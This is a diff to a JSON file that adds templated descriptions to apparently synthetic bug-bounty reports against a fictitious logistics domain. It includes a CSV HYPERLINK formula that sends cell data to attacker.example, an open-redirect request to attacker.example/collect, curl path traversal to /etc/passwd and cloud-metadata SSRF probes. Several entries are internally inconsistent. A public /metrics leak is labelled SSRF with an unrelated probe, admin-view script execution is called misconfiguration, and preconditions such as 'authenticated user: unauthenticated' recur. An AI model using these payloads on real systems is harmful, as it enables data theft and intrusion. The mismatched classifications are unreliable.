+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.auenrhein-logistics.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5828,7 +5872,8 @@
           "offset": "5d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.auenrhein-logistics.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5972,7 +6017,8 @@
           "offset": "7d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.auenrhein-logistics.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6083,7 +6129,8 @@
           "offset": "1d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.auenrhein-logistics.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6205,7 +6252,8 @@
           "offset": "4d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.auenrhein-logistics.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6315,7 +6363,8 @@
           "offset": "8d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.auenrhein-logistics.foo/export`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6455,7 +6504,8 @@
           "offset": "20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.auenrhein-logistics.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6603,7 +6653,8 @@
           "offset": "6d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.auenrhein-logistics.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6710,7 +6761,8 @@
           "offset": "2d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.auenrhein-logistics.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6845,7 +6897,8 @@
           "offset": "5d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.auenrhein-logistics.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6959,7 +7012,8 @@
           "offset": "2d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7058,7 +7112,8 @@
           "offset": "3d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.auenrhein-logistics.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7242,7 +7297,8 @@
           "offset": "7d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.auenrhein-logistics.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7383,7 +7439,8 @@
           "offset": "5d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7470,7 +7527,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.auenrhein-logistics.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7554,7 +7612,8 @@
           "offset": "1d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7666,7 +7725,8 @@
           "offset": "1d 21h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.auenrhein-logistics.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7786,7 +7846,8 @@
           "offset": "15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.auenrhein-logistics.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7953,7 +8014,8 @@
           "offset": "4d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.auenrhein-logistics.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8105,7 +8167,8 @@
           "offset": "7d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.auenrhein-logistics.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8232,7 +8295,8 @@
           "offset": "6d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.auenrhein-logistics.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8370,7 +8434,8 @@
           "offset": "3d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8501,7 +8566,8 @@
           "offset": "6d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.auenrhein-logistics.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8613,7 +8679,8 @@
           "offset": "2d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.auenrhein-logistics.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8777,7 +8844,8 @@
           "offset": "6d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.auenrhein-logistics.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8908,7 +8976,8 @@
           "offset": "7d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.auenrhein-logistics.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9066,7 +9135,8 @@
           "offset": "5d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.auenrhein-logistics.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9189,7 +9259,8 @@
           "offset": "3d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.auenrhein-logistics.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9325,7 +9396,8 @@
           "offset": "2d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.auenrhein-logistics.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9476,7 +9548,8 @@
           "offset": "5d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9600,7 +9673,8 @@
           "offset": "8d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.auenrhein-logistics.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9723,7 +9797,8 @@
           "offset": "1d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
